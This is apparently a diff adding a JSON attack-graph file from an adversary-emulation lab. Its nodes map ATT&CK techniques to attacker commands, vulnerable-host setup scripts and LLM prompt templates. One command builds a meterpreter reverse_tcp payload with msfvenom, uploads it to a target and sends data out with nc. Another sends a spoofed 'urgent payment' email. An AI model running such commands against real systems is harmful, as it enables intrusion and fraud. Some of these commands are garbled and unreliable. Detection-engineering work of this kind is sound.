+        "curl -sL https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/msfvenom > msfvenom && chmod +x msfvenom && ./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.21.0.10 LPORT=4444 -f elf > /tmp/rev.elf && curl -X POST -F \"file=@/tmp/rev.elf\" http://172.21.0.20/tmp/upload && curl http://172.21.0.20/tmp/rev.elf && curl -X POST http://172.21.0.20/tmp/rev.elf && nc -nv 172.21.0.20 9000 < call_audio.wav"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip curl sox && useradd -m -s /bin/bash victim && echo 'victim:Vish@2024' | chpasswd && mkdir -p /home/victim/callrecordings && chown victim:victim /home/victim/callrecordings && printf '#!/usr/bin/env python3\\nimport socket\\nimport os\\nhost=\\\"0.0.0.0\\\"\\nport=9000\\nsock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\nsock.bind((host,port))\\nsock.listen(1)\\nwhile True:\\n conn,addr=sock.accept()\\n with open(\\\"/home/victim/callrecordings/recorded_call.wav\\\",\\\"wb\\\") as f:\\n  while True:\\n   data=conn.recv(1024)\\n   if not data:\\n    break\\n   f.write(data)\\n conn.close()\\n' > /home/victim/voice_server.py && chmod +x /home/victim/voice_server.py && su - victim -c 'nohup python3 /home/victim/voice_server.py &'"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "8bef15d9-9b74-4db3-a894-a1b7c09ca128"
+      ],
+      "child_nodes": [
+        "f6124c14-f847-42a0-8a14-eae3eea4c01e"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1598.004 - Spearphishing Voice\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors initiated voice calls with victims to socially engineer them into authorizing malicious applications or divulging sensitive credentials.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "f6124c14-f847-42a0-8a14-eae3eea4c01e",
+      "node_index": 17,
+      "node_type": "structural",
+      "technique_id": "T1656",
+      "technique_name": "Impersonation",
+      "tactic": "defense-evasion",
+      "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   \n \nImpersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity.\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors impersonated IT support personnel in voice calls with victims at times claiming to be addressing enterprise-wide connectivity issues.",
+      "required_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "provides": [
+        "evasion_capability"
+      ],
+      "attacker_commands": [
+        "echo \"Subject: Urgent payment request\\nFrom: it-support@example.com\\nTo: victim@hosta.example.com\\n\\nPlease process the attached invoice immediately.\" | sendmail -S 172.21.0.20 -f it-support@example.com victim@hosta.example.com"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y postfix mailutils && printf 'root: it-support@example.com\\n' > /etc/aliases && newaliases && echo \"myhostname = hosta.example.com\" >> /etc/postfix/main.cf && echo \"mydestination = localhost, hosta.example.com\" >> /etc/postfix/main.cf && /usr/lib/postfix/sbin/postfix start"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "bde025cc-9f68-45dc-b78b-3cfdb7289ea4"
+      ],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1656 - Impersonation\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors impersonated IT support personnel in voice calls with victims at times claiming to be addressing enterprise-wide connectivity issues.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing for Information, Phishing, or Internal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims. \n \nIn many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables Financial Theft.\nAdversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.   \n \nImpersonation is typically preceded by reconnaissance techniques such as Gather Victim Identity Information and Gather Victim Org Information as well as acquiring infrastructure such as email domains (i.e. Domains) to substantiate their false identity.\n \nThere is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications",
+        "Must evade default detection mechanisms"
+      ],
+      "cleanup_template": "Restore original configurations",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "capability:modify_system_settings"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    }
+  ],
+  "dag_representation": {
+    "nodes": [
+      {
+        "id": "T1608.005",
+        "original_id": "5521de91-f38d-441f-8218-ade93a12dfa7",
+        "technique_id": "T1608.005",
+        "technique_name": "Link Target",
+        "tactic": "resource-development",
+        "index": 0,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1059.006",
+        "original_id": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf",
+        "technique_id": "T1059.006",
+        "technique_name": "Python",
+        "tactic": "execution",
+        "index": 1,
+        "provides": [
+          "execution_capability",
+          "code_execution"
+        ],
+        "prerequisites": [
+          "need:execution_vector",
+          "access:initial"
+        ]
+      },
+      {
+        "id": "T1213.004",
+        "original_id": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6",
+        "technique_id": "T1213.004",
+        "technique_name": "Customer Relationship Management Software",
+        "tactic": "collection",
+        "index": 2,
+        "provides": [
+          "collected_data"
+        ],
+        "prerequisites": [
+          "data:available",
+          "access:target"
+        ]
+      },
+      {
+        "id": "T1671",
+        "original_id": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9",
+        "technique_id": "T1671",
+        "technique_name": "Cloud Application Integration",
+        "tactic": "persistence",
+        "index": 3,
+        "provides": [
+          "persistent_access"
+        ],
+        "prerequisites": [
+          "access:initial",
+          "capability:write_to_persistence_locations"
+        ]
+      },
+      {
+        "id": "T1078.002",
+        "original_id": "895d1ea1-1841-476e-85af-5144bfef843b",
+        "technique_id": "T1078.002",
+        "technique_name": "Domain Accounts",
+        "tactic": "defense-evasion",
+        "index": 4,
+        "provides": [
+          "evasion_capability"
+        ],
+        "prerequisites": [
+          "capability:modify_system_settings"
+        ]
+      },
+      {
+        "id": "T1567",
+        "original_id": "1dceef18-a7c0-43b4-85cb-68a27b452615",
+        "technique_id": "T1567",
+        "technique_name": "Exfiltration Over Web Service",
+        "tactic": "exfiltration",
+        "index": 5,
+        "provides": [
+          "exfiltrated_data"
+        ],
+        "prerequisites": [
+          "data:collected",
+          "need:c2_channel",
+          "c2:established"
+        ]
+      },
+      {
+        "id": "T1036",
+        "original_id": "b416b8c7-56e3-4776-9c42-395c9ee54ac4",
+        "technique_id": "T1036",
+        "technique_name": "Masquerading",
+        "tactic": "defense-evasion",
+        "index": 6,
+        "provides": [
+          "evasion_capability"
+        ],
+        "prerequisites": [
+          "capability:modify_system_settings"
+        ]
+      },
+      {
+        "id": "T1090",
+        "original_id": "632d1194-f237-4866-9955-876afe5c66a9",
+        "technique_id": "T1090",
+        "technique_name": "Proxy",
+        "tactic": "command-and-control",
+        "index": 7,
+        "provides": [
+          "c2_channel",
+          "proxy_use"
+        ],
+        "prerequisites": [
+          "access:initial",
+          "network:egress_allowed"
+        ]
+      },
+      {
+        "id": "T1585.002",
+        "original_id": "ead35c74-f5b4-4815-84be-4ab46417f14e",
+        "technique_id": "T1585.002",
+        "technique_name": "Email Accounts",
+        "tactic": "resource-development",
+        "index": 8,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1083",
+        "original_id": "60314478-c12d-4b58-a1e6-61b0266e35a9",
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "index": 9,
+        "provides": [
+          "user_info",
+          "discovered_info",
+          "network_info",
+          "system_info"
+        ],
+        "prerequisites": [
+          "access:target"
+        ]
+      },
+      {
+        "id": "T1090.003",
+        "original_id": "324222fc-6b0e-4c6e-be4f-af4341b9638e",
+        "technique_id": "T1090.003",
+        "technique_name": "Multi-hop Proxy",
+        "tactic": "command-and-control",
+        "index": 10,
+        "provides": [
+          "c2_channel"
+        ],
+        "prerequisites": [
+          "access:initial",
+          "network:egress_allowed"
+        ]
+      },
+      {
+        "id": "T1585",
+        "original_id": "cfac895c-b867-4a99-a75f-8ebc9ea7a627",
+        "technique_id": "T1585",
+        "technique_name": "Establish Accounts",
+        "tactic": "resource-development",
+        "index": 11,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1587.001",
+        "original_id": "81c697e5-93ad-4fba-a95c-d8ccc24d177c",
+        "technique_id": "T1587.001",
+        "technique_name": "Malware",
+        "tactic": "resource-development",
+        "index": 12,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1588.002",
+        "original_id": "02cc5bfb-7791-43b9-a79b-f65960ac0296",
+        "technique_id": "T1588.002",
+        "technique_name": "Tool",
+        "tactic": "resource-development",
+        "index": 13,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1020",
+        "original_id": "66ce7433-d369-43df-b456-c0588adbe640",
+        "technique_id": "T1020",
+        "technique_name": "Automated Exfiltration",
+        "tactic": "exfiltration",
+        "index": 14,
+        "provides": [
+          "exfiltrated_data"
+        ],
+        "prerequisites": [
+          "data:collected",
+          "c2:established"
+        ]
+      },
+      {
+        "id": "T1586.002",
+        "original_id": "8bef15d9-9b74-4db3-a894-a1b7c09ca128",
+        "technique_id": "T1586.002",
+        "technique_name": "Email Accounts",
+        "tactic": "resource-development",
+        "index": 15,
+        "provides": [
+          "resources",
+          "infrastructure"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1598.004",
+        "original_id": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4",
+        "technique_id": "T1598.004",
+        "technique_name": "Spearphishing Voice",
+        "tactic": "reconnaissance",
+        "index": 16,
+        "provides": [
+          "target_intel"
+        ],
+        "prerequisites": []
+      },
+      {
+        "id": "T1656",
+        "original_id": "f6124c14-f847-42a0-8a14-eae3eea4c01e",
+        "technique_id": "T1656",
+        "technique_name": "Impersonation",
+        "tactic": "defense-evasion",
+        "index": 17,
+        "provides": [
+          "evasion_capability"
+        ],
+        "prerequisites": [
+          "capability:modify_system_settings"
+        ]
+      }
+    ],
+    "edges": [
+      {
+        "from": "T1608.005",
+        "to": "T1059.006"
+      },
+      {
+        "from": "T1059.006",
+        "to": "T1213.004"
+      },
+      {
+        "from": "T1213.004",
+        "to": "T1671"
+      },
+      {
+        "from": "T1671",
+        "to": "T1078.002"
+      },
+      {
+        "from": "T1078.002",
+        "to": "T1567"
+      },
+      {
+        "from": "T1567",
+        "to": "T1036"
+      },
+      {
+        "from": "T1036",
+        "to": "T1090"
+      },
+      {
+        "from": "T1090",
+        "to": "T1585.002"
+      },
+      {
+        "from": "T1585.002",
+        "to": "T1083"
+      },
+      {
+        "from": "T1083",
+        "to": "T1090.003"
+      },
+      {
+        "from": "T1090.003",
+        "to": "T1585"
+      },
+      {
+        "from": "T1585",
+        "to": "T1587.001"
+      },
+      {
+        "from": "T1587.001",
+        "to": "T1588.002"
+      },
+      {
+        "from": "T1588.002",
+        "to": "T1020"
+      },
+      {
+        "from": "T1020",
+        "to": "T1586.002"
+      },
+      {
+        "from": "T1586.002",
+        "to": "T1598.004"
+      },
+      {
+        "from": "T1598.004",
+        "to": "T1656"
+      }
+    ],
+    "levels": {
+      "0": [
+        "T1608.005"
+      ],
+      "1": [
+        "T1059.006"
+      ],
+      "2": [
+        "T1213.004"
+      ],
+      "3": [
+        "T1671"
+      ],
+      "4": [
+        "T1078.002"
+      ],
+      "5": [
+        "T1567"
+      ],
+      "6": [
+        "T1036"
+      ],
+      "7": [
+        "T1090"
+      ],
+      "8": [
+        "T1585.002"
+      ],
+      "9": [
+        "T1083"
+      ],
+      "10": [
+        "T1090.003"
+      ],
+      "11": [
+        "T1585"
+      ],
+      "12": [
+        "T1587.001"
+      ],
+      "13": [
+        "T1588.002"
+      ],
+      "14": [
+        "T1020"
+      ],
+      "15": [
+        "T1586.002"
+      ],
+      "16": [
+        "T1598.004"
+      ],
+      "17": [
+        "T1656"
+      ]
+    },
+    "adjacency_list": {
+      "T1608.005": {
+        "parents": [],
+        "children": [
+          "T1059.006"
+        ]
+      },
+      "T1059.006": {
+        "parents": [
+          "T1608.005"
+        ],
+        "children": [
+          "T1213.004"
+        ]
+      },
+      "T1213.004": {
+        "parents": [
+          "T1059.006"
+        ],
+        "children": [
+          "T1671"
+        ]
+      },
+      "T1671": {
+        "parents": [
+          "T1213.004"
+        ],
+        "children": [
+          "T1078.002"
+        ]
+      },
+      "T1078.002": {
+        "parents": [
+          "T1671"
+        ],
+        "children": [
+          "T1567"
+        ]
+      },
+      "T1567": {
+        "parents": [
+          "T1078.002"
+        ],
+        "children": [
+          "T1036"
+        ]
+      },
+      "T1036": {
+        "parents": [
+          "T1567"
+        ],
+        "children": [
+          "T1090"
+        ]
+      },
+      "T1090": {
+        "parents": [
+          "T1036"
+        ],
+        "children": [
+          "T1585.002"
+        ]
+      },
+      "T1585.002": {
+        "parents": [
+          "T1090"
+        ],
+        "children": [
+          "T1083"
+        ]
+      },
+      "T1083": {
+        "parents": [
+          "T1585.002"
+        ],
+        "children": [
+          "T1090.003"
+        ]
+      },
+      "T1090.003": {
+        "parents": [
+          "T1083"
+        ],
+        "children": [
+          "T1585"
+        ]
+      },
+      "T1585": {
+        "parents": [
+          "T1090.003"
+        ],
+        "children": [
+          "T1587.001"
+        ]
+      },
+      "T1587.001": {
+        "parents": [
+          "T1585"
+        ],
+        "children": [
+          "T1588.002"
+        ]
+      },
+      "T1588.002": {
+        "parents": [
+          "T1587.001"
+        ],
+        "children": [
+          "T1020"
+        ]
+      },
+      "T1020": {
+        "parents": [
+          "T1588.002"
+        ],
+        "children": [
+          "T1586.002"
+        ]
+      },
+      "T1586.002": {
+        "parents": [
+          "T1020"
+        ],
+        "children": [
+          "T1598.004"
+        ]
+      },
+      "T1598.004": {
+        "parents": [
+          "T1586.002"
+        ],
+        "children": [
+          "T1656"
+        ]
+      },
+      "T1656": {
+        "parents": [
+          "T1598.004"
+        ],
+        "children": []
+      }
+    },
+    "roots": [
+      "T1608.005"
+    ],
+    "leaves": [
+      "T1656"
+    ]
+  },
+  "runtime_nodes": [],
+  "edges": [
+    {
+      "from": "5521de91-f38d-441f-8218-ade93a12dfa7",
+      "to": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf"
+    },
+    {
+      "from": "6abc9383-e24f-4126-a5a2-8a3737fc2ebf",
+      "to": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6"
+    },
+    {
+      "from": "a5d0f1d0-b9b2-4a3a-a855-732737ec67a6",
+      "to": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9"
+    },
+    {
+      "from": "aa1d940d-87c0-4fcc-bd7c-66fdf0f455d9",
+      "to": "895d1ea1-1841-476e-85af-5144bfef843b"
+    },
+    {
+      "from": "895d1ea1-1841-476e-85af-5144bfef843b",
+      "to": "1dceef18-a7c0-43b4-85cb-68a27b452615"
+    },
+    {
+      "from": "1dceef18-a7c0-43b4-85cb-68a27b452615",
+      "to": "b416b8c7-56e3-4776-9c42-395c9ee54ac4"
+    },
+    {
+      "from": "b416b8c7-56e3-4776-9c42-395c9ee54ac4",
+      "to": "632d1194-f237-4866-9955-876afe5c66a9"
+    },
+    {
+      "from": "632d1194-f237-4866-9955-876afe5c66a9",
+      "to": "ead35c74-f5b4-4815-84be-4ab46417f14e"
+    },
+    {
+      "from": "ead35c74-f5b4-4815-84be-4ab46417f14e",
+      "to": "60314478-c12d-4b58-a1e6-61b0266e35a9"
+    },
+    {
+      "from": "60314478-c12d-4b58-a1e6-61b0266e35a9",
+      "to": "324222fc-6b0e-4c6e-be4f-af4341b9638e"
+    },
+    {
+      "from": "324222fc-6b0e-4c6e-be4f-af4341b9638e",
+      "to": "cfac895c-b867-4a99-a75f-8ebc9ea7a627"
+    },
+    {
+      "from": "cfac895c-b867-4a99-a75f-8ebc9ea7a627",
+      "to": "81c697e5-93ad-4fba-a95c-d8ccc24d177c"
+    },
+    {
+      "from": "81c697e5-93ad-4fba-a95c-d8ccc24d177c",
+      "to": "02cc5bfb-7791-43b9-a79b-f65960ac0296"
+    },
+    {
+      "from": "02cc5bfb-7791-43b9-a79b-f65960ac0296",
+      "to": "66ce7433-d369-43df-b456-c0588adbe640"
+    },
+    {
+      "from": "66ce7433-d369-43df-b456-c0588adbe640",
+      "to": "8bef15d9-9b74-4db3-a894-a1b7c09ca128"
+    },
+    {
+      "from": "8bef15d9-9b74-4db3-a894-a1b7c09ca128",
+      "to": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4"
+    },
+    {
+      "from": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4",
+      "to": "f6124c14-f847-42a0-8a14-eae3eea4c01e"
+    }
+  ],
+  "capability_flow": {
+    "initial_capabilities": [
+      "resources",
+      "infrastructure"
+    ],
+    "final_capabilities": [
+      "proxy_use",
+      "target_intel",
+      "evasion_capability",
+      "resources",
+      "infrastructure",
+      "system_info",
+      "network_info",
+      "exfiltrated_data",
+      "discovered_info",
+      "persistent_access",
+      "execution_capability",
+      "c2_channel",
+      "collected_data",
+      "user_info",
+      "code_execution"
+    ],
+    "capability_chain": [
+      {
+        "node_index": 0,
+        "technique": "T1608.005 - Link Target",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "resources",
+          "infrastructure"
+        ]
+      },
+      {
+        "node_index": 1,
+        "technique": "T1059.006 - Python",
+        "adds": [
+          "execution_capability",
+          "code_execution"
+        ],
+        "cumulative_capabilities": [
+          "code_execution",
+          "resources",
+          "infrastructure",
+          "execution_capability"
+        ]
+      },
+      {
+        "node_index": 2,
+        "technique": "T1213.004 - Customer Relationship Management Software",
+        "adds": [
+          "collected_data"
+        ],
+        "cumulative_capabilities": [
+          "resources",
+          "infrastructure",
+          "execution_capability",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 3,
+        "technique": "T1671 - Cloud Application Integration",
+        "adds": [
+          "persistent_access"
+        ],
+        "cumulative_capabilities": [
+          "resources",
+          "infrastructure",
+          "persistent_access",
+          "execution_capability",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 4,
+        "technique": "T1078.002 - Domain Accounts",
+        "adds": [
+          "evasion_capability"
+        ],
+        "cumulative_capabilities": [
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "persistent_access",
+          "execution_capability",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 5,
+        "technique": "T1567 - Exfiltration Over Web Service",
+        "adds": [
+          "exfiltrated_data"
+        ],
+        "cumulative_capabilities": [
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "exfiltrated_data",
+          "persistent_access",
+          "execution_capability",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 6,
+        "technique": "T1036 - Masquerading",
+        "adds": [
+          "evasion_capability"
+        ],
+        "cumulative_capabilities": [
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "exfiltrated_data",
+          "persistent_access",
+          "execution_capability",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 7,
+        "technique": "T1090 - Proxy",
+        "adds": [
+          "c2_channel",
+          "proxy_use"
+        ],
+        "cumulative_capabilities": [
